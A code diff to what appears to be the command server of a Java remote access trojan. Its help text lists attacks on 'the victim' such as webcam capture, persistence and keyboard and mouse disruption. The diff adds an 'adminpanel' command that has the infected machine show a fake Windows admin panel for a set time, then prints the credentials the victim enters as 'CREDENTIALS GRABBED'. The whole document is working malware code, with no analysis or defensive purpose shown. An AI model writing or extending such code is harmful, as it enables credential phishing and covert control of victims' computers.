@@ -41,6 +41,7 @@ public class Server implements Runnable {
                     System.out.println("\twebcam - take an image using the victims camera");
                     System.out.println("\tmousebreak - prevent the victims mouse from moving");
                     System.out.println("\tkeybreak - create issues with the victims keyboard");
+                    System.out.println("\tadminpanel - creates a fake windows admin panel");
                 }
                 if (command.equals("persist")) {
                     System.out.println("persistence module initiated");
@@ -97,6 +98,22 @@ public class Server implements Runnable {
                 if (command.equals("keybreak")) {
                     System.out.println("keybreak attack initiated");
                     
+                }
+                if (command.equals("adminpanel")) {
+                    System.out.println("starting remote admin panel");
+                    ps.println("ap99");
+                    System.out.println("how long would you like the panel to remain in seconds?");
+                    int seconds = (int)Keyboard.readDouble();
+                    ps.println(seconds);
+                    din.readLine();
+                    String line = "";
+                    System.out.println("WINDOW INITIATED\nLISTENING FOR CREDENTIALS...\n\n");
+                    din.readLine();
+                    din.readLine();
+                    while(!line.equals("{}{}{}")) {
+                        System.out.println("CREDENTIALS GRABBED - " + line);
+                        line=din.readLine();
+                    }
                 }
             }
             /*
